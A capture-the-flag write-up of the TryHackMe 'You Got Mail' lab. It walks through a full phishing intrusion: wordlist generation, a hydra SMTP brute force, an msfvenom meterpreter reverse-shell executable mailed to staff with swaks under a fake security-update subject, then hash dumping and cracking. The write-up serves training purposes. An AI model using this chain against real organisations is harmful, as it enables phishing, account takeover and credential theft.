---
date: 2025-02-09T14:59:41-06:00
# description: ""
image: "/images/THM-YouGotMail/YGM.png"
showTableOfContents: true
tags: ["TryHackMe"]
categories: ["Writeups"]
title: "THM: You Got Mail"
type: "post"
---

* Platform: TryHackMe
* Link: [You Got Mail](https://tryhackme.com/room/yougotmail)
* Level: Medium
* OS: Windows
---

This room focuses on a phishing attack. After collecting an email list, we use `cewl` to create a customized password list. Hydra, successfully recovers the password for one of the email accounts. With `swaks`, we send a phishing email that results in a reverse shell on the target system. From there, we retrieve the password for a user account as well as the admin password for `hMailServer`.

## Scanning

```
nmap -T4 -n -sC -sV -Pn -p- {TARGET_IP}
```

**Results**

```shell           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 17:28 CST
Warning: 10.10.16.179 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.16.179
Host is up (0.18s latency).
Not shown: 65504 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
25/tcp    open     smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

110/tcp   open     pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP

135/tcp   open     msrpc         Microsoft Windows RPC

139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn

143/tcp   open     imap          hMailServer imapd
|_imap-capabilities: CAPABILITY IDLE QUOTA RIGHTS=texkA0001 CHILDREN NAMESPACE completed IMAP4 ACL IMAP4rev1 OK SORT

445/tcp   open     microsoft-ds?

587/tcp   open     smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY

3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2025-02-09T21:23:09
|_Not valid after:  2025-08-11T21:23:09
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-10T23:43:35+00:00
|_ssl-date: 2025-02-10T23:43:42+00:00; 0s from scanner time.

4349/tcp  filtered fsportmap
4750/tcp  filtered ssad

5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

17854/tcp filtered unknown
18527/tcp filtered unknown
22815/tcp filtered unknown
24814/tcp filtered unknown
30513/tcp filtered unknown

47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

47010/tcp filtered unknown

49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49669/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     msrpc         Microsoft Windows RPC

50388/tcp filtered unknown
51348/tcp filtered unknown
53546/tcp filtered unknown
62352/tcp filtered unknown
64819/tcp filtered unknown
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-10T23:43:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 947.53 seconds
```

Nmap finds some default Windows services (SMB and MSRPC), some email services (SMTP and POP3), and a web server (we were given `https://brownbrick.co/` as part of our scope).

## Enumeration

At `https://brownbrick.co/` we find a static website.

![target website](/images/THM-YouGotMail/YGM_website.png)

Since we were told to only do passive reconnaissance on `https://brownbrick.co/` there is no point in trying directory bruteforcing or subdomain enumeration.

On the "Our Team" page at `https://brownbrick.co/menu.html` we can make a list of emails.

![email list](/images/THM-YouGotMail/emails_list.png)

```
oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co
```

We can send some data at `https://brownbrick.co/reservation.html?` but nothing seems exploitable.

We can also send information at `https://brownbrick.co/contact.html` but we get told that the email server isn't responding.

![No response from the email server](/images/THM-YouGotMail/server_no_response.png)

Let's create a custom password list with `cewl`.

```
cewl --lowercase https://brownbrick.co/ > pwds.txt
```

![custom password list with cewl](/images/THM-YouGotMail/custom_pwds_list.png)

Using hydra we run a brute force attack with the generated passwords against the emails.

```
hydra -L emails.txt -P pwds.txt {TARGET_IP} smtp -s 587 
```

> The ports used by SMTP have different purposes. Port 587 is used to send emails from clients to mail servers (SMTP Submission) while port 25 is used for server-to-server email transmission (SMTP relay).

We find a match for `lhedvig@brownbrick.co:bricks`.

![hydra SMTP brute force attack](/images/THM-YouGotMail/hydra_smtp.png)

We can test the connection to a specific mailbox through POP3 using TELNET, but it turns out to be empty.

```
telnet {TARGET_IP} 110
USER lhedvig@brownbrick.co
PASS bricks
```

![Mailbox access via telnet](/images/THM-YouGotMail/telnet_check.png)

## User flag

We have a valid email address and some additional ones. Let's try to send some emails with a malicious attachment.

* We create a malicious exe file with msfvenom to use as an attachment.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=443 -f exe > payload.exe
```

* We setup a listener in Metasploit.

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT PORT_NUMBER
run
```

We can send an email to all the other email addresses using [swaks](https://github.com/jetmore/swaks).

```shell
for email in oaurelius@brownbrick.co tchikondi@brownbrick.co wrohit@brownbrick.co pcathrine@brownbrick.co fstamatis@brownbrick.co; do
    swaks --to $email --from lhedvig@brownbrick.co \
    --server 10.10.16.179 --port 25 --auth LOGIN \
    --auth-user lhedvig@brownbrick.co --auth-password bricks \
    --header "Subject: Urgent Security Update" \
    --body "Please review the attachment" \
    --attach @payload.exe
done
```

![Emails sent via swaks](/images/THM-YouGotMail/swaks_send_emails.png)

We get a meterpreter shell as `wrohit` and can read the user flag.

![user flag](/images/THM-YouGotMail/flag_txt.png)

With `net localgroup` we notice that this user is part of the `Administrators` group among many others.

![group memberships](/images/THM-YouGotMail/group_memberships.png)

### wrohit password recovered

Since we have elevated privileges, in our meterpreter shell we use `hashdump` to dump the user password hashes.

![hashdump command](/images/THM-YouGotMail/hashdump.png)

On [CrackStation](https://crackstation.net/) we recover the password of `wrohit`.

![wrohit password](/images/THM-YouGotMail/wrohit_pwd.png)

## hMailServer Administrator password

The password hash of the `hMailServer Administrator Dashboard` is in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI`.

![hMailServer password hash](/images/THM-YouGotMail/admin_pwd.png)

We can also crack it on [CrackStation](https://crackstation.net/).

![hMailServer admin password](/images/THM-YouGotMail/cracked_admin_pwd.png)








